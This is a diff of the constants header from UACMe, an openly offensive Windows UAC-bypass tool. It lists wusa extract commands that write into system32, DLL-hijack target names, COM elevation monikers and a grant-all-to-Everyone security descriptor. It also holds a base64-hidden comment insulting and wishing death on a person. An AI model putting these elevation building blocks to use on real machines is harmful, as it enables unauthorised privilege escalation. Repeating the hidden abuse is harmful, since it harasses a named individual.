@@ -4,9 +4,9 @@
 *
 *  TITLE:       CONSTS.H
 *
-*  VERSION:     2.00
+*  VERSION:     2.10
 *
-*  DATE:        16 Nov 2015
+*  DATE:        16 Apr 2016
 *
 *  Global consts definition file.
 *
@@ -18,63 +18,69 @@
 *******************************************************************************/
 #pragma once
 
-#define T_IFEO                L"MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options"
-#define T_AVRFDLL             L"Hibiki.dll"
-#define T_AVRF_SOURCEDLL      L"%temp%\\Hibiki.dll"
-#define T_AVRF_CMDLINE        L"/c wusa %ws /extract:%%windir%%\\system32"
-#define T_WINSATSRC           L"%temp%\\winsat.exe"
-#define T_WINSAT_CMDLINE      L"/c wusa %ws /extract:%%windir%%\\system32\\sysprep"
-#define T_WINSAT_TARGET       L"%systemroot%\\system32\\sysprep\\winsat.exe"
+#define AKAGI_XOR_KEY               '.poi'
 
-#define T_IIS_TARGETDIR       L"%systemroot%\\system32\\inetsrv"
-#define T_IIS_TARGETAPP       L"InetMgr.exe"
-#define T_IIS_TARGETDLL       L"SLC.dll"
-
-//
-// Standard elevation methods.
-//
-#define M1W7_SOURCEDLL         L"%temp%\\CRYPTBASE.dll"
-#define M1W7_TARGETDIR         L"%systemroot%\\system32\\sysprep\\"
-#define M1W7_TARGETPROCESS     L"%systemroot%\\system32\\sysprep\\sysprep.exe"
-#define M1W8_SOURCEDLL         L"%temp%\\shcore.dll"
-#define M1WALL_SOURCEDLL       L"%temp%\\wdscore.dll"
-#define M1W7T_SOURCEDLL        L"%temp%\\ActionQueue.dll"
-#define M1W10_SOURCEDLL        L"%temp%\\dbgcore.dll"
-#define M1WALL_TARGETDIR       L"%systemroot%\\system32\\oobe\\"
-#define M1WALL_TARGETPROCESS   L"%systemroot%\\system32\\oobe\\setupsqm.exe"
-#define IFILEOP_ELEMONIKER     L"Elevation:Administrator!new:{3ad05575-8857-4850-9277-11b85bdb8e09}"
-#define SYSTEMROOTDIR          L"%systemroot%\\system32\\"
-#define WBEMDIR                L"%systemroot%\\system32\\wbem"
-#define TEMPDIR                L"%temp%\\"
-
+#define T_IFEO                      L"MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options"
 #define T_UACKEY                    L"MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\system"
+
+#define CMD_EXTRACT_SYSTEM32        L"/c wusa %ws /extract:%%windir%%\\system32"
+#define CMD_EXTRACT_WINSAT          L"/c wusa %ws /extract:%%windir%%\\system32\\sysprep"
+#define CMD_EXTRACT_MIGWIZ          L"/c wusa %ws /extract:%%windir%%\\system32\\migwiz"
+
+#define T_CLSID_ShellSecurityEditor L"{4D111E08-CBF7-4f12-A926-2C7920AF52FC}"
+#define T_IID_ISecurityEditor       L"{14B2C619-D07A-46EF-8B62-31B64F3B845C}"
+#define ISECURITYEDITOR_ELEMONIKER  L"Elevation:Administrator!new:{4D111E08-CBF7-4f12-A926-2C7920AF52FC}" 
+#define IFILEOP_ELEMONIKER          L"Elevation:Administrator!new:{3ad05575-8857-4850-9277-11b85bdb8e09}"
 #define T_SDDL_ALL_FOR_EVERYONE     L"D:(A;;GA;;;WD)"
 
-//default fake msu cabinet name
-#define T_MSUPACKAGE_NAME           L"%temp%\\ellocnak.msu"
+#define APPHELP_DLL                 L"apphelp.dll"
+#define HIBIKI_DLL                  L"Hibiki.dll"
+#define ELLOCNAK_MSU                L"ellocnak.msu"            
+#define SLC_DLL                     L"SLC.dll"
+#define NETUTILS_DLL                L"netutils.dll"
+#define ACTIONQUEUE_DLL             L"ActionQueue.dll"
+#define WDSCORE_DLL                 L"wdscore.dll"
+#define DBGCORE_DLL                 L"dbgcore.dll"
+#define SHCORE_DLL                  L"shcore.dll"
+#define CRYPTBASE_DLL               L"cryptbase.dll"
+#define NTWDBLIB_DLL                L"ntwdblib.dll"
+#define ELSEXT_DLL                  L"elsext.dll"
+#define POWRPROF_DLL                L"powrprof.dll"
+#define DEVOBJ_DLL                  L"devobj.dll"
+#define UNBCL_DLL                   L"unbcl.dll"
+#define CLICONFG_EXE                L"cliconfg.exe"
+#define OOBE_EXE                    L"oobe.exe"
+#define WINSAT_EXE                  L"winsat.exe"
+#define CREDWIZ_EXE                 L"credwiz.exe"
+#define INETMGR_EXE                 L"InetMgr.exe"
+#define MMC_EXE                     L"mmc.exe"
+#define EXPLORER_EXE                L"explorer.exe"
+#define EVENTVWR_MSC                L"eventvwr.msc"
+#define SYSPREP_DIR                 L"sysprep\\"
+#define INETSRV_DIR                 L"inetsrv\\"
+#define WBEM_DIR                    L"wbem\\"
+#define SYSPREP_EXE                 L"sysprep\\sysprep.exe" //always in this dir (appinfo hardcoded)
+#define SETUPSQM_EXE                L"oobe\\setupsqm.exe"   //always in this dir
+#define MIGWIZ_EXE                  L"migwiz\\migwiz.exe"   //always in this dir
+#define KERNEL32_DLL                L"kernel32.dll"
+#define OLE32_DLL                   L"ole32.dll"
+#define SHELL32_DLL                 L"shell32.dll"
+#define RUNAS_VERB                  L"runas"
 
-#define METHOD_MIGWIZ_SOURCEDLL     L"%temp%\\wdscore.dll"
-#define METHOD_MIGWIZ_CMDLINE       L"/c wusa %ws /extract:%%windir%%\\system32\\migwiz"
-#define METHOD_MIGWIZ_TARGETAPP     L"%systemroot%\\system32\\migwiz\\migwiz.exe"
+#define APPCMDLINE                  L"hawawawa"
+#define PROGRAMTITLE                L"UACMe"
+#define WOW64STRING                 L"Wow64 detected, use x64 version of this tool."
+#define WOW64WIN32ONLY              L"This method only works with x86-32 Windows or from Wow64"
+#define WIN64ONLY                   L"Thos method only works with x86-64 Windows"
+#define LAZYWOW64UNSUPPORTED        L"Use 32 bit version of this tool on 32 bit OS version"
+#define OSTOOOLD                    L"This method require Windows 7 and above"
+#define WINBLUEWANTED               L"This method require Windows 8 and above"
+#define UACFIX                      L"This method fixed/unavailable in the current version of Windows, do you still want to continue?"
+#define T_AKAGI_KEY                 L"Software\\Akagi"
+#define T_AKAGI_PARAM               L"LoveLetter"
 
-#define METHOD_SQLSRV_SOURCEDLL     L"%temp%\\ntwdblib.dll"
-#define METHOD_SQLSRV_CMDLINE       L"/c wusa %ws /extract:%%windir%%\\system32"
-#define METHOD_SQLSRV_TARGETAPP     L"%systemroot%\\system32\\cliconfg.exe"
-
-
-#define PROGRAMTITLE TEXT("#UACMe#")
-#define WOW64STRING TEXT("Apparently it seems you are running under WOW64.\n\r\
-This is not supported, run x64 version of this tool.")
-#define WOW64WIN32ONLY TEXT("This method only works with x86-32 Windows or from Wow64")
-#define WIN64ONLY TEXT("Thos method only works with x86-64 Windows")
-#define LAZYWOW64UNSUPPORTED TEXT("Use 32 bit version of this tool on 32 bit OS version")
-#define OSTOOOLD TEXT("This method require Window 7 and above")
-#define UACFIX TEXT("This method fixed/unavailable in the current version of Windows, do you still want to continue?")
-#define RESULTOK TEXT("Bye-bye!")
-#define RESULTFAIL TEXT("Something went wrong")
-#define T_AKAGI_KEY    L"Software\\Akagi"
-#define T_AKAGI_PARAM  L"LoveLetter"
-
-#define T_KERNEL32 L"kernel32.dll"
-#define T_OLE32    L"ole32.dll"
-#define T_SHELL32  L"shell32.dll"
+//
+// Global const 
+//
+// SGVsbG8sIHhzeXN2ZXJtaW4uIFlvdSBzdHVwaWQgcmlwcGVyIGZyb20gQ2hpbmEsIGhvcGUgeW91IHdpbGwgZGllIGluIHBhaW4gZnJvbSBkaWFycmhlYSA6KSBIYXZlIGEgbmljZSBkYXksIGZ1Y2tlci4=
+//
